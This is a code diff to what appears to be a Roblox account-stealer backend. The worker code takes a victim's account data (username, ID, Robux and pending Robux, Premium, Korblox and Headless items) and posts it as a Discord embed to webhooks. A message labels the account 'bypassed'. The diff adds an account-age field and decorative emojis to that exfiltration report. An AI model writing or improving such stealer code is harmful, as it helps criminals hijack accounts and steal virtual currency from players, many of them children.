@@ -331,22 +331,36 @@ export default {
         const fireUrl = 'https://cdn.discordapp.com/emojis/1334544007027626051.webp?size=160&animated=true';
         const checkUrl = 'https://cdn.discordapp.com/emojis/1334546267040387074.webp?size=160';
         const crossUrl = 'https://cdn.discordapp.com/emojis/1334547784287785031.webp?size=160';
+        const robuxUrl = 'https://cdn.discordapp.com/emojis/1334544097062424586.webp?size=160';
+        const moneyUrl = 'https://cdn.discordapp.com/emojis/1334576383862771793.webp?size=160';
 
         const yes = '<:check:1334546267040387074>';
         const no = '<:cross:1334547784287785031>';
         const fire = '<a:whitefire:1334544007027626051>';
+        const robuxEmoji = '<:robux:1334544097062424586>';
+        const moneyEmoji = '<:money:1334576383862771793>';
 
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
           const d = data.data;
           const profileLink = 'https://www.roblox.com/users/' + d.userId + '/profile';
           const thumbnailLink = 'https://www.roblox.com/headshot-thumbnail/image?userId=' + d.userId + '&width=420&height=420&format=png';
-          
+
+          // Calculate account age in days
+          let accountAge = 'Unknown';
+          if (d.created) {
+            const created = new Date(d.created);
+            const now = new Date();
+            const diffTime = Math.abs(now - created);
+            accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
+          }
+
           const fields = [
             { name: 'User', value: '[' + (d.username || 'Unknown') + '](' + profileLink + ')', inline: true },
             { name: 'ID', value: d.userId || 'N/A', inline: true },
-            { name: 'Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
-            { name: 'Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
+            { name: 'Account Age', value: accountAge, inline: true },
+            { name: robuxEmoji + ' Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
+            { name: moneyEmoji + ' Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
             { name: 'Premium', value: d.premium ? yes : no, inline: true },
             { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
             { name: 'Headless', value: d.headless ? yes : no, inline: true },
@@ -377,12 +391,22 @@ export default {
           const d = data.data;
           const profileLink = 'https://www.roblox.com/users/' + d.userId + '/profile';
           const thumbnailLink = 'https://www.roblox.com/headshot-thumbnail/image?userId=' + d.userId + '&width=420&height=420&format=png';
-          
+
+          // Calculate account age in days
+          let accountAge = 'Unknown';
+          if (d.created) {
+            const created = new Date(d.created);
+            const now = new Date();
+            const diffTime = Math.abs(now - created);
+            accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
+          }
+
           const fields = [
             { name: 'User', value: '[' + (d.username || 'Unknown') + '](' + profileLink + ')', inline: true },
             { name: 'ID', value: d.userId || 'N/A', inline: true },
-            { name: 'Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
-            { name: 'Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
+            { name: 'Account Age', value: accountAge, inline: true },
+            { name: robuxEmoji + ' Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
+            { name: moneyEmoji + ' Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
             { name: 'Premium', value: d.premium ? yes : no, inline: true },
             { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
             { name: 'Headless', value: d.headless ? yes : no, inline: true },
@@ -520,6 +544,7 @@ export default {
         const userData = await userResponse.json();
         const userId = userData.id;
         const username = userData.name;
+        const created = userData.created;
 
         const currencyResponse = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
           headers: {
@@ -583,6 +608,7 @@ export default {
           description: 'Account: ' + username + ' (' + userId + ') bypassed',
           username: username,
           userId: userId,
+          created: created,
           robux: robux,
           pendingRobux: pendingRobux,
           premium: premium,
